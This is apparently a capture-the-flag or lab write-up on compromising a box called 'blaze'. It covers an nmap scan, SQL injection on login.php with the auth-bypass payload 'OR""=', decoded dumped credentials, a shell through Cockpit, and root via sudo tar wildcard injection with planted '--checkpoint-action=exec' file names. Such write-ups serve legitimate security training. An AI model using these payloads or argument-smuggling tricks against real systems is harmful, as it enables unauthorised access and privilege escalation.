My IP: 192.168.45.158
Target IP: 192.168.210.10

nmap:
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: blaze
9090/tcp open  http    Cockpit web service 198 - 220
|_http-title: Did not follow redirect to https://192.168.210.10:9090/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Port 22: Can be good if we can get ssh keys or credentials to a user. 

Port 80:
Enumeration on the web:
- Very boring two buttons that dont do anything. Even after checking with burpsuite to see what was picked up..nothing. 
- Run gobuster:
	- login.php            (Status: 200)
		- Blaze login page. Tried admin admin, got invalid password. I then tested for sqli with admin' and was able to generate a new message
```
Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%' AND password like '%%'' at line 1
```
- This tells us that we are using MySQL in the back end to interpret our commands.
- Query shape leaked by the error: `username LIKE '%<input>%' AND password LIKE '%<input>%'`.
- **Auth bypass:** loaded the **PayloadsAllTheThings MySQL Injection** list into Burp Intruder and let it run. Winning payload:
```
'OR""='
```

Credentials obtained:

james:Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI=
cameron:dGhpc3NjYW50dGJldG91Y2hlZGRANDU1MTUy

Appear to be base 64 encoded
- james:canttouchhhthiss@455152
- cameron:thisscanttbetouchedd@455152
tried using these credentials to log into the dashboard and it did not work.

Port 9090
- Observed that there was a login page. Tried admin admin, and the target IP for an IP to connect to. Was given an error..
- tried admin' to see if there was an sqli 
- Cockpit web login accepts the dumped creds → logged in as **james**. Cockpit → **Terminal** gives a shell as james.

Privesc → root:
- `sudo -l` → `(ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *`
- The trailing `*` = **wildcard injection**. Planted flag-named files (`--checkpoint=1`, `--checkpoint-action=exec=sh priv.sh`) so tar runs my payload as root → SUID root bash → root.
- Full technique + the ownership gotcha I hit: [[Tar-Wildcard-Sudo-to-Root]]